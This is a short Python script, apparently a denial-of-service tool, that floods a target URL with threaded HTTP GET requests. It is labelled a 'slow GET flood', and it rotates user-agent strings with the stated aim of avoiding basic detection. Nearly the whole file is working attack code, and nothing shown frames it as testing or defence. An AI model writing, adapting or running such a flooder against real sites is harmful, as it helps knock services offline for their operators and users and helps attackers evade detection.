import requests
import time
import threading
import sys
import random

# Optional: Rotating user agents to avoid basic detection
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 11)"
]

def slow_get_flood(url, delay_between_requests, total_requests, thread_id):
    """
    Sends HTTP GET requests to the target URL with a delay between each request.
    """
    for i in range(total_requests):
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Cache-Control": "no-cache",
                "Pragma": "no-cache"
            }
            response = requests.get(url, headers=headers, timeout=5)
            status = response.status_code
            print(f"[Thread {thread_id}] [{i+1}/{total_requests}] GET -> {url} | Status: {status}")
        except requests.RequestException as e:
            print(f"[Thread {thread_id}] [{i+1}/{total_requests}] Request failed: {e}")
        time.sleep(delay_between_requests)

def run_threads(url, delay, total_requests, thread_count):
    """
    Runs multiple threads to send GET requests concurrently.
    """
    threads = []
    print(f"\n[*] Launching {thread_count} threads | {total_requests} requests each | {delay}s delay")
    start_time = time.time()

    for thread_id in range(1, thread_count + 1):
        t = threading.Thread(target=slow_get_flood, args=(url, delay, total_requests, thread_id))
        t.start()
        threads.append(t)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Shutting down gracefully...")

    elapsed = round(time.time() - start_time, 2)
    print(f"\n[✓] Completed in {elapsed} seconds.")

def is_valid_url(url):
    return url.startswith("http://") or url.startswith("https://")

def run_slow_get_flood(url, delay_sec, requests_per_thread, num_threads):
    run_threads(url, delay_sec, requests_per_thread, num_threads)
